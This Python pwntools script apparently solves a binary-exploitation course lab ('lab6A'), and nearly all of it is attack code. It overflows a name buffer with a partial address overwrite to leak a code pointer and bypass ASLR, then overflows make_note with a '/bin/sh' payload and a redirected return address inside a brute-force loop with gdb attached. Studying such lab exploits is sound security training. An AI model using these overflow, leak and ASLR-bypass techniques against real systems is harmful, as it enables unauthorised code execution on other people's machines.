from pwn import *
import subprocess
import time
import signal

def sigint_handler(signum, frame):
    term_gdb.kill()
    exit()
 
signal.signal(signal.SIGINT, sigint_handler)


# context.terminal = ['tmux', 'splitw', '-h']

# IP = '172.16.70.133'
# PORT = 6642
# local = True
# if not local:
#     r = remote(IP, PORT)
# else:
#     r = process("./lab6A")

gdbscript_file = 'lab6A.gdb.txt'

#### Notes ####
# on my development machine I had a null byte in ebp
# so I added some gdb functions work around this
#### End ####

f = open(gdbscript_file, 'w')
f.write('''
set follow-fork-mode child
define stack
x/64xw $esp
end
# break setup_account
# break make_note
# break write_wrap
# break *setup_account+162
# break *setup_account+271
break *make_note+48
continue
x/64xw $esp
''')

# print_name:    0x0be2
# make_note:     0x09af  
# print_listing: 0x09e0
# write_wrap:    0x097a

f.close()

# r.interactive()

max_iter = 32
i = 0
while (i < max_iter):
    try:
        r = process("./lab6A")

        # term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6A" %d -x "%s"' % (r.pid, gdbscript_file)])
        # # print 'tmux splitw -h /usr/bin/gdb "./lab6B" %d -x "%s"' % (r.pid, gdbscript_file)
        # # term_gdb = subprocess.Popen(['tmux', 'splitw', '-h', '/usr/bin/gdb "./lab6B" %d -x "%s"' % (r.pid, gdbscript_file)])
        # time.sleep(1)

        print r.read(500)

        # Call print_name to leak the memory pointer
        r.sendline('1')
        print r.read(200)
        r.sendline('A'*31)
        print r.read(200)
        r.sendline('A'*90 + '\xe2\x0b\x00')
        print r.read(200)
        r.sendline('3')
        resp = r.read(200)
        print resp
        ptr32 = u32(resp[170:174])
        # print resp.encode('hex')
        print "0x%08x" % ptr32
        # r.interactive()

        term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6A" %d -x "%s"' % (r.pid, gdbscript_file)])
        time.sleep(1)
        
        # r.interactive()

        # Call make_note which is vulnerable to stack overflow
        r.sendline('1')
        print r.read(200)
        r.sendline('B'*30+'\x00')
        print r.read(200)
        r.sendline('B'*92 + p16((ptr32&0xf000)+0x09af) + '\x00')
        resp = r.read(200)  
        print resp
        print resp.encode('hex')
        r.sendline('3')
        print r.read(200)

        # Overflow make_note
        # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE 
        write_wrap = p32((ptr32&0xfffff000)+0x097a) 
        # r.sendline('A'*40+'B'*12+'CCCC') 
        r.sendline('/bin/sh\0'+'A'*32 + 'B'*12 + write_wrap)

        r.interactive()

    except:
        r.close()
    i += 1

    # # Call print_name to leak the memory pointer
    # r.sendline('A'*40+'B'*16)
    # print r.read(200)

    # r.sendline()

    # r.interactive()

